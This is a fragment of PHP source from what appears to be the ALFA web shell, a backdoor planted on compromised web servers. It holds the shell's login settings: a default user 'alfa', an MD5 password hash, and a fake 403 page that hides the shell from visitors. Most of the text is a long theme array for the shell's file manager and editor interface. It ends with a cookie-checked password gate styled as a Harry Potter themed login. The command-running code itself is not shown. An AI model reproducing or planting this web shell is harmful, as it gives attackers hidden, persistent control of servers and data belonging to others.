...
$GLOBALS['oZgNypoPRU'] = array(
    'username' => 'alfa',
    'password' => '650fdfed95f57fd164169befa6a14357',//md5(ehsan)
    'safe_mode' => '1',
    'login_page' => '403',
    'show_icons' => '1',
...
$GLOBALS['__ALFA_COLOR__'] = array(
    "shell_border" => array(
        "key_color" => "rgba(255,255,255,0.15)",
        "multi_selector" => array(
            ".header" => "border: 1px solid {color}; backdrop-filter: blur(10px);",
            "#meunlist" => "border-color: {color}; backdrop-filter: blur(10px);",
            "#hidden_sh" => "background-color: {color}; backdrop-filter: blur(10px);",
            ".ajaxarea" => "border: 1px solid {color}; backdrop-filter: blur(10px);",
            ".foot" => "border-color: {color}; backdrop-filter: blur(10px);",
        )
    ),
    "header_vars" => "#ffffff",
    "header_values" => "#b8e0ff",
    "header_on" => "#00ff88",
    "header_off" => "#ff4444",
    "header_none" => "#cccccc",
    "home_shell" => "#ffffff",
    ...
    "header_show_all" => "#66ffdd",
    "disable_functions" => "#ff3333",
    "footer_text" => "#ffffff",
    "menu_options" => "#ffffff",
    "menu_options:hover" => array(
        "key_color" => "rgba(255,255,255,0.08)",
        "multi_selector" => array(
            ".menu_options:hover" => "background-color: {color};font-weight: unset;backdrop-filter: blur(5px);",
        )
    ),
    "options_list" => array(
        "key_color" => "#ffffff",
    ...
    "hidden_shell_version" => "#cccccc",
    "shell_name" => "#ffffff",
    "main_row:hover" => array(
        "key_color" => "rgba(255,255,255,0.08)",
        "multi_selector" => array(
            ".main tr:hover" => "background-color: {color}; backdrop-filter: blur(6px);",
        )
    ),
    "main_header" => array(
        "key_color" => "#ffffff",
    ...
    "main_size" => "#cccccc",
    "main_modify" => "#cccccc",
    "main_owner_group" => "#cccccc",
    "main_green_perm" => "#00ff99",
    "main_red_perm" => "#ff3333",
    "main_white_perm" => "#ffffff",
    "beetween_perms" => "#cccccc",
    "main_actions" => array(
        "key_color" => "#ffffff",
        "multi_selector" => array(
    ...
    "minimize_editor_background" => array(
        "key_color" => "rgba(255,255,255,0.1)",
        "multi_selector" => array(
            ".minimized-wrapper" => "background-color: {color}; backdrop-filter: blur(8px);",
        )
    ),
    ...
    "editor_border" => array(
        "key_color" => "rgba(255,255,255,0.2)",
        "multi_selector" => array(
            ".editor-explorer,.editor-modal" => "border: 1px solid {color}; backdrop-filter: blur(10px);",
        )
    ),
    "editor_background" => array(
        "key_color" => "rgba(255, 255, 255, 0.07)",
        "multi_selector" => array(
            ".editor-explorer,.editor-modal" => "background-color: {color}; backdrop-filter: blur(14px);",
        )
    ),
    "editor_header_background" => array(
        "key_color" => "rgba(255,255,255,0.1)",
        "multi_selector" => array(
            ".editor-header" => "background-color: {color}; backdrop-filter: blur(10px);",
        )
    ),
    ...
    "editor_history_selected_file" => array(
        "key_color" => "rgba(255,255,255,0.1)",
        "multi_selector" => array(
            ".is_active" => "background-color: {color}; backdrop-filter: blur(10px);",
        )
    ),
    "editor_history_file:hover" => array(
        "key_color" => "rgba(255,255,255,0.15)",
        "multi_selector" => array(
            ".file-holder > .history:hover" => "background-color: {color}; backdrop-filter: blur(10px);",
        )
    ),
    "input_box_border" => array(
        "key_color" => "rgba(255,255,255,0.2)",
        "multi_selector" => array(
            "input[type=text],textarea" => "border: 1px solid {color}; backdrop-filter: blur(6px);",
        )
    ),
    ...
    "input_box:hover" => array(
        "key_color" => "#ffffff",
        "multi_selector" => array(
            "input[type=text]:hover,textarea:hover" => "box-shadow:0 0 6px {color};border:1px solid {color};",
        )
    ),
    "select_box_border" => array(
        "key_color" => "rgba(255,255,255,0.2)",
        "multi_selector" => array(
            "select" => "border: 1px solid {color}; backdrop-filter: blur(6px);",
        )
    ),
    ...
    "select_box:hover" => array(
        "key_color" => "#ffffff",
        "multi_selector" => array(
            "select:hover" => "box-shadow:0 0 6px {color};border:1px solid {color};",
        )
    ),
    "button_border" => array(
        "key_color" => "rgba(255,255,255,0.25)",
        "multi_selector" => array(
            "input[type=submit],.button,#addup" => "border: 1px solid {color}; backdrop-filter: blur(8px);",
        )
    ),
    "button:hover" => array(
        "key_color" => "#ffffff",
        "multi_selector" => array(
            "input[type=submit]:hover" => "box-shadow:0 0 6px {color};border:2px solid {color};",
            ".button:hover,#addup:hover" => "box-shadow:0 0 6px {color};border:1px solid {color};",
        )
    ),
    "outputs_text" => array(
        "key_color" => "#ffffff",
    ...
    "outputs_border" => array(
        "key_color" => "rgba(255,255,255,0.2)",
        "multi_selector" => array(
            ".ml1" => "border: 1px solid {color}; backdrop-filter: blur(8px);",
        )
    ),
    "uploader_border" => array(
        "key_color" => "rgba(255,255,255,0.2)",
        "multi_selector" => array(
            ".inputfile" => "box-shadow:0 0 6px {color};border:1px solid {color}; backdrop-filter: blur(6px);",
        )
    ),
    "uploader_background" => array(
        "key_color" => "rgba(255,255,255,0.1)",
        "multi_selector" => array(
            ".inputfile strong" => "background-color: {color}; backdrop-filter: blur(6px);",
        )
    ),
    ...
    "uploader:hover" => array(
        "key_color" => "#ffffff",
        "multi_selector" => array(
            ".inputfile:hover" => "box-shadow:0 0 6px {color};border:1px solid {color};",
        )
    ),
    ...
    "scrollbar_background" => array(
        "key_color" => "rgba(255,255,255,0.05)",
        "multi_selector" => array(
...
exit;
	...
	if(@$_COOKIE["AlfaPass"] != @md5($config['AlfaPass'])){
		...
		// Begin Hogwarts Legacy-style Liquid Glass Login Page
		...
		body {
			...
			background: url("https://images.unsplash.com/photo-1617243876873-6cea4ea0b4eb") no-repeat center center fixed;
		...
		.glass-container .quote {
			...
			<form method="post">
				<div class="glass-container">
					...
					<input type="password" name="password" placeholder="Enter Access Spell..." required>
					<input type="submit" value="Unlock">
					<div class="quote">"Happiness can be found even in the darkest of times..."</div>
				</div>
			</form>
		</body></html>';
		exit;
